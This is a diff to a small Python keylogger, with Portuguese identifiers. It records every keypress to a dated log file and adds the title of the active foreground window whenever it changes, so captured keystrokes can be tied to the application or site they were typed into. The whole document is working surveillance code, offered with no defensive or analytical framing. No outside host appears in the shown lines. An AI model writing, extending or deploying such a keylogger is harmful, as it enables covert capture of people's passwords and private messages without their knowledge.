@@ -1,6 +1,7 @@
 from pynput import keyboard
 import datetime
 import os
+import win32gui
 
 try:
     os.mkdir('./Logs')
@@ -10,6 +11,7 @@ class KeyLogger():
     timeStamp = str(datetime.date.today()).replace('-','')
     def __init__(self, NomeDoArquivo: str = './Logs/'+timeStamp+'.txt') -> None:
         self.NomeDoArquivo = NomeDoArquivo
+        self.j2 = ''
 
     @staticmethod
     def get_char(Tecla):
@@ -24,7 +26,17 @@ class KeyLogger():
 
     def on_press(self, Tecla):
         with open(self.NomeDoArquivo, 'a') as logs:
+            logs.write(self.get_win_name())
             logs.write(self.get_char(Tecla))
+            
+    def get_win_name(self):
+        janela=win32gui
+        self.j1 = janela.GetWindowText(janela.GetForegroundWindow())
+        if self.j1 != self.j2:
+            self.j2 = self.j1
+            return '\n+- '+self.j2+' -+\n'
+        else:
+            return ''
 
     def main(self):
         escuta = keyboard.Listener(
